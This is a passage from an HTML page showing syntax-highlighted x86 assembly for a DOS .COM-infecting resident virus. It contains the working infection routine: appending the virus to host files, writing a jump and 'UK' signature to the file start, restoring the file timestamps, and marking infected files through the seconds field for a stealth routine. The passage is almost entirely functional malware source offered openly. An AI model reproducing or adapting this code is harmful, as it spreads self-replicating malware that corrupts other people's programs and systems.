        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; .OVL.  The result would be a hang.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">         </span><span class="sc1">; reset file date and time</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">           </span><span class="sc1">; close file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                      </span><span class="sc1">; exit</span><span class="sc0">

</span><span class="sc5">infect_host</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">         </span><span class="sc1">; reset pointer to end of file</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">            </span><span class="sc1">; a standard appending infection</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">            </span><span class="sc1">; routine which is suitable</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">            </span><span class="sc1">; for most resident .COM infecting</span><span class="sc0">
                     </span><span class="sc1">; viruses</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">close</span><span class="sc0">


        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">     
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">     
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">putjmp</span><span class="sc4">[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; write virus to the target file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0">        </span><span class="sc1">; length in cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">      </span><span class="sc1">; set file pointer to beginning of host</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">; write the first five bytes of the</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">         </span><span class="sc1">; viral jump and vanity string to the</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">putjmp</span><span class="sc0"> </span><span class="sc1">; beginning of the host file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">31</span><span class="sc0"> </span><span class="sc1">; set the seconds field to 31, so the</span><span class="sc0">
                    </span><span class="sc1">; "stealth" routine has its cue</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close</span><span class="sc0">           </span><span class="sc1">; close the file and clean up</span><span class="sc0">




</span><span class="sc5">putjmp</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">        </span><span class="sc1">; &lt;----- data, jump and vanity sig for</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; virus to copy to beginning of host</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'UK'</span><span class="sc0">



</span><span class="sc5">fileseg</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">      </span><span class="sc1">; &lt;--- buffer for seg:off of files</span><span class="sc0">
                   </span><span class="sc1">; opened by user activated programs</span><span class="sc0">


</span><span class="sc5">mark</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; &lt;-----end of virus</span><span class="sc0">

</span><span class="sc9">size</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">pargrph</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc0">    </span><span class="sc1">; virus size in memory in 16-byte</span><span class="sc0">
             </span><span class="sc1">; paragraphs</span><span class="sc0">


    </span><span class="sc5">code</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
           </span><span class="sc9">end</span><span class="sc0">   </span><span class="sc5">begin</span><span class="sc0">


</span></div></body>
</html>
